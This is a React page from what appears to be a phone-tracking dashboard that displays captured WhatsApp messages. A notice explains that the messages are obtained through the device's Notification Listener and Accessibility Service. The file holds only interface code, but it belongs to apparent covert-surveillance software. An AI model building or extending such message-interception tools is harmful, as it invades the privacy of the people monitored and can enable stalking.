import { SocialChatPage } from "@/components/dashboard/social-chat-page"
import { Info } from "lucide-react"

export const metadata = {
  title: "WhatsApp Messages | Tracker Dashboard",
}

export default function WhatsAppPage() {
  return (
    <div className="space-y-3 animate-in fade-in">
      {/* Capture method notice */}
      <div className="flex items-start gap-2.5 px-4 py-3 rounded-lg border border-green-200 bg-green-50 dark:bg-green-950/30 dark:border-green-900 text-sm text-green-800 dark:text-green-300">
        <Info className="h-4 w-4 mt-0.5 shrink-0" />
        <p>
          <span className="font-semibold">Capture method:</span> Messages are captured via the
          Notification Listener and Accessibility Service running on the device. End-to-end encrypted
          messages may appear as notifications; full conversation history requires Accessibility access.
        </p>
      </div>

      <SocialChatPage
        platform="whatsapp"
        platformName="WhatsApp"
        platformIcon="💬"
        platformColor="#25D366"
      />
    </div>
  )
}
